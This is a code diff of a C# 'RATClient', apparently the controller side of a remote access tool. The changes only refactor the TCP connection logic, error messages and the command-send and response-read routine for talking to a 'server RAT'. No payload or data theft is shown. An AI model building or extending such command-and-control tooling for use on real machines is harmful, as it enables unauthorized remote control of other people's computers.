@@ -76,25 +76,20 @@ namespace RATClient
             if (!sock.Connected) {
                 string[] IPInfo = Dest.Split(':');
                 IPAddress ip = IPAddress.Parse(IPInfo[0]);
-                int port = 0;
-                int.TryParse(IPInfo[1], out port);
+                int.TryParse(IPInfo[1], out int port);
                 try
                 {
                     sock = new TcpClient();
                     sock.Connect(ip, port);
-                    Console.WriteLine("RAT Client: Connected To: " + ip.ToString() + ":" + port.ToString());
+                    Console.WriteLine("RAT Client: Connected To: " + ip.ToString() + ":" + port.ToString() + ".");
                 }
-                catch (Exception e)
+                catch
                 {
-                    //if (My.Computer.Network.Ping(""))
-                    //{
-                    Console.WriteLine("Error: The server RAT is not opened.");
-                    Console.WriteLine("Error: An internet connection cannot be established.");
-                    //}
+                    Console.WriteLine("Error: The Server RAT Is Unreachable.");
                 }
             } else
             {
-                Console.WriteLine("Already Connected - Disconnect First");
+                Console.WriteLine("Already Connected - Disconnect First.");
             }
         }
         static void SendCommand(string[] CMDS)
@@ -113,8 +108,7 @@ namespace RATClient
             nstream.Write(sendBytes, 0, sendBytes.Length);
             nstream.Flush();
             byte[] message = new byte[sock.ReceiveBufferSize + 1];
-            int bytesRead = 0;           
-            bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
+            int bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
             if (bytesRead == 0) return;
             Response r = DeserializeFromXml<Response>(Encoding.ASCII.GetString(message, 0, bytesRead));
             if (r.Type == "Message") { Console.WriteLine(r.Msg); }
